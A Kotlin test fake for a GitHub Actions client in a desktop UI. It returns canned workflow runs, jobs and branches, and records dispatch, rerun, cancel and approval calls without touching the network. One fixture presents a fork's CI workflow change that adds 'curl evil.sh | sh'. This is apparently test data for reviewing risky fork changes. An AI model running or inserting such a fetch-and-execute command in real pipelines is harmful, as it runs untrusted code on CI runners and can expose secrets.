package dev.chieppa.arc.ui

import dev.chieppa.arc.core.actions.InputKind
import dev.chieppa.arc.core.actions.PendingDeployment
import dev.chieppa.arc.core.actions.RunAnnotation
import dev.chieppa.arc.core.actions.RunArtifact
import dev.chieppa.arc.core.actions.RunConclusion
import dev.chieppa.arc.core.actions.RunJob
import dev.chieppa.arc.core.actions.RunRef
import dev.chieppa.arc.core.actions.RunStatus
import dev.chieppa.arc.core.actions.RunStep
import dev.chieppa.arc.core.actions.Workflow
import dev.chieppa.arc.core.actions.WorkflowInput
import dev.chieppa.arc.core.actions.WorkflowRun
import dev.chieppa.arc.core.actions.WorkflowSpec
import dev.chieppa.arc.core.actions.log.KeptLine
import dev.chieppa.arc.core.actions.log.KeptLog
import dev.chieppa.arc.host.github.actions.Branch
import dev.chieppa.arc.host.github.actions.Conditional
import dev.chieppa.arc.host.github.actions.DispatchResult
import dev.chieppa.arc.host.github.actions.ForkChange
import dev.chieppa.arc.host.github.actions.ForkChanges
import dev.chieppa.arc.host.github.actions.ShipsSince
import dev.chieppa.arc.host.github.pulls.RateBudget
import dev.chieppa.arc.host.github.repo.GitHubRepo
import dev.chieppa.arc.ui.services.ActionsService
import java.nio.file.Path
import java.time.Instant

/** GitHub Actions for tests: runs set by the test, every write recorded, nothing sent anywhere. */
class FakeActions : ActionsService {
    val repo = GitHubRepo("lumen", "api")
    var runs: MutableMap<String, List<WorkflowRun>> = mutableMapOf()
    var jobs: MutableMap<Long, List<RunJob>> = mutableMapOf()
    var pending: MutableMap<Long, List<PendingDeployment>> = mutableMapOf()
    val writes = mutableListOf<String>()
    var runsAsked = 0

    override suspend fun hasToken(): Boolean = true
    override suspend fun runs(repo: GitHubRepo, etag: String?): Conditional<List<WorkflowRun>> {
        runsAsked++
        return Conditional(runs[repo.fullName.lowercase()].orEmpty(), "e")
    }
    override suspend fun run(repo: GitHubRepo, id: Long): WorkflowRun? = runs.values.flatten().firstOrNull { it.id == id }
    override suspend fun jobs(repo: GitHubRepo, run: Long, etag: String?): Conditional<List<RunJob>> = Conditional(jobs[run].orEmpty(), null)
    override suspend fun artifacts(repo: GitHubRepo, run: Long): List<RunArtifact> = emptyList()
    override suspend fun pendingDeployments(repo: GitHubRepo, run: Long): List<PendingDeployment> = pending[run].orEmpty()
    override suspend fun annotations(repo: GitHubRepo, job: RunJob): List<RunAnnotation> = emptyList()
    override suspend fun canPush(repo: GitHubRepo): Boolean = true
    override suspend fun keptLog(repo: GitHubRepo, job: RunJob): KeptLog = KeptLog(listOf(KeptLine(0, 1, null, "##[error]boom")), 1, 14)
    override suspend fun fullLog(repo: GitHubRepo, job: Long, line: (String) -> Unit): Boolean = true
    override suspend fun workflows(repo: GitHubRepo): List<Workflow> = listOf(Workflow(9, "speckit · implement", ".github/workflows/speckit-implement.yml"))
    override suspend fun branches(repo: GitHubRepo): List<Branch> = listOf(Branch("main", "4f2a91c0"))
    override suspend fun environments(repo: GitHubRepo): List<String> = listOf("staging", "production")
    override suspend fun workflowSpec(repo: GitHubRepo, path: String, ref: String): WorkflowSpec = WorkflowSpec(
        "speckit · implement",
        listOf(
            WorkflowInput("issue", InputKind.Number, required = true),
            WorkflowInput("agent", InputKind.Choice, options = listOf("default", "large")),
            WorkflowInput("dry_run", InputKind.Boolean, description = "Plan only, open no PR"),
        ),
    )
    override suspend fun shipsSince(repo: GitHubRepo, environment: String, head: String): ShipsSince? = null
    override suspend fun forkChanges(repo: GitHubRepo, owner: String, branch: String): ForkChanges =
        ForkChanges(93, listOf(ForkChange(".github/workflows/ci.yml", "modified", "+  run: curl evil.sh | sh")))
    override suspend fun artifactFile(run: RunRef, artifact: RunArtifact): Path? = null
    override suspend fun dispatch(repo: GitHubRepo, workflowFile: String, ref: String, inputs: Map<String, String>): DispatchResult {
        writes += "dispatch $workflowFile@$ref ${inputs.toSortedMap()}"
        return DispatchResult(2302)
    }
    override suspend fun rerun(repo: GitHubRepo, run: Long, failedOnly: Boolean, debug: Boolean) {
        writes += "rerun $run failedOnly=$failedOnly debug=$debug"
    }
    override suspend fun rerunJob(repo: GitHubRepo, job: Long, debug: Boolean) {
        writes += "rerun job $job"
    }
    override suspend fun cancel(repo: GitHubRepo, run: Long) {
        writes += "cancel $run"
    }
    override suspend fun reviewDeployments(repo: GitHubRepo, run: Long, environments: List<Long>, approve: Boolean, comment: String) {
        writes += "review $run $environments approve=$approve"
    }
    override suspend fun approveFork(repo: GitHubRepo, run: Long) {
        writes += "approve fork $run"
    }
    override val budget: RateBudget = RateBudget(5000, 4712, null)
    override fun cacheBytes(): Long = 0
    override val cacheCap: Long = 0

    companion object {
        val NOW: Instant = Instant.now()

        fun run(
            id: Long,
            name: String,
            status: RunStatus = RunStatus.Completed,
            conclusion: RunConclusion? = RunConclusion.Success,
            actor: String = "jpark",
            headOwner: String? = "lumen",
            repo: String = "lumen/api",
        ) = WorkflowRun(
            repo, id, 7, name, ".github/workflows/${name.lowercase()}.yml", "title $id", id.toInt(), 1, "push", status, conclusion, "main",
            "7d41e0a", actor, actor, NOW.minusSeconds(600), NOW.minusSeconds(590), NOW.minusSeconds(60), emptyList(), headOwner, "https://github.com/$repo/actions/runs/$id",
        )

        fun job(id: Long, name: String, state: RunConclusion? = RunConclusion.Success) = RunJob(
            id, 1, name, if (state == null) RunStatus.InProgress else RunStatus.Completed, state, NOW.minusSeconds(590), NOW.minusSeconds(580),
            if (state == null) null else NOW.minusSeconds(100),
            listOf(RunStep(1, "Set up job", RunStatus.Completed, RunConclusion.Success, NOW.minusSeconds(580), NOW.minusSeconds(578))),
        )
    }
}
